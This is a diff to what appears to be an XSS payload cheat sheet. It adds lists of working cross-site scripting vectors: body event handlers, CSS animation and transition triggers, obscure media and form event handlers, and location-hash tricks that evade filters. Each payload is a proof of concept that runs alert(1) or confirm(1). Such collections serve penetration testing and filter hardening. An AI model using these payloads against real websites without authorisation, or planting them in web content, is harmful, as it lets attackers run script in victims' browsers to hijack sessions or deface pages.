@@ -85,6 +85,15 @@ top.open`javas\cript:al\ert\x281\x29${0}0`
 "onpointerover=alert(1) /
 "autofocus onfocusin=alert(1) /
 "'>confirm&lpar;1)</Script><Svg><Script/1='
+</Script/"'--><Body /Autofocus /OnFocus = confirm`1` <!-->
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><meta content=URL;%23 http-equiv=refresh>
+<body onscrol=alert(1) style=overflow:auto;height:1000px id=x>#x
+<body onscrol=alert(1)><br><br><br><br><br><br><br><br><br><br><x id=x>#x
+<body onresize=alert(1)>
+<body onhelp=alert(1)>
 ```
 
 ## Strip-Tags Based Bypass
@@ -193,4 +202,46 @@ document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
 ```
 <!--><svg onload=alert(1)-->
 ```
+
+## CSS Payloads
+
+```
+<x onanimationend=alert(1)><style>x{animation:s}@keyframes s{}
+<x onanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
+<x onwebkitanimationend=alert(1)><style>x{animation:s}@keyframes s{}
+<x onwebkitanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
+<x ontransitionend=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<x ontransitionrun=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<x ontransitionstart=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<x ontransitioncancel=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+```
+
+## Less Known XSS Vectors
+
+```
+<marquee onstart=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<video ontimeupdate=alert(1) controls src=/brutelogic.com.br/x.mp4>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+<object onerror=alert(1)>
+```
+
+## Location with URL Fragment
+
+```
+javascript/onmouseover=location=tagName+innerHTML+location.hash>:/*hoverme! </javascript>#*/alert(1)
+<javascript/onmouseover=location=tagName+innerHTML+location.hash>:'hoverme! </javascript>#'-alert(1)
+<javascript:'-`/onmouseover=location=tagName+URL>hoverme!#`-alert(1)
+<j/onmouseover=location=innerHTML+URL>javascript:'-`hoverme!</j>#`-alert(1)
+<javas/onmouseover=location=tagName+innerHTML+URL>cript:'-`hoverme!</javas> #`-alert(1)
+<javascript:/onmouseover=location=tagName+URL>hoverme!#%0Aalert(1)
+<j/onmouseover=location=innerHTML+URL>javascript:</j>#%0Aalert(1)
+<javas/onmouseover=location=tagName+innerHTML+URL>cript:</javas>#%0Aalert(1)
+``
+
 
